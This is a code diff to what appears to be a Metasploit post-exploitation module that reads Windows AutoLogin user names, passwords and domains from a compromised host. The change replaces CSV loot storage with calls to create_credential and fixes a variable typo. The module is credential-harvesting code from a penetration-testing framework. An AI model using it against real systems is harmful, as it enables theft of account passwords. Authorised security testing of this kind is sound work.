@@ -42,15 +42,7 @@ class Metasploit3 < Msf::Post
     host_name = sysinfo['Computer']
     print_status("Running against #{host_name} on session #{datastore['SESSION']}")
 
-    creds = Rex::Ui::Text::Table.new(
-      'Header'  => 'Windows AutoLogin Password',
-      'Indent'   => 1,
-      'Columns' => [
-        'UserName',
-        'Password',
-        'Domain'
-      ]
-    )
+    creds = []
 
     has_al = 0
 
@@ -69,7 +61,6 @@ class Metasploit3 < Msf::Post
 
     if do1 != '' and  du1 != '' and dp1 == '' and al == '1'
       has_al = 1
-      dp1 = '[No Password!]'
       creds << [du1,dp1, do1]
       print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
     elsif do1 != '' and  du1 != '' and dp1 != ''
@@ -80,8 +71,7 @@ class Metasploit3 < Msf::Post
 
     if do2 != '' and  du2 != '' and dp2 == '' and al == '1'
       has_al = 1
-      dp2 = '[No Password!]'
-      creds << [du2,dp2,d02]
+      creds << [du2,dp2,do2]
       print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
     elsif do2 != '' and  du2 != '' and dp2 != ''
       has_al = 1
@@ -94,16 +84,18 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    print_status("Storing data...")
-    path = store_loot(
-      'windows.autologin.user.creds',
-      'text/csv',
-      session,
-      creds.to_csv,
-      'windows-autologin-user-creds.csv',
-      'Windows AutoLogin User Credentials'
-    )
-
-    print_status("Windows AutoLogin User Credentials saved in: #{path}")
+    creds.each do |cred|
+      create_credential(
+        workspace_id: myworkspace_id,
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        username: cred[0],
+        private_data: cred[1],
+        private_type: :password,
+        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+        realm_value: cred[2]
+      )
+    end
   end
 end
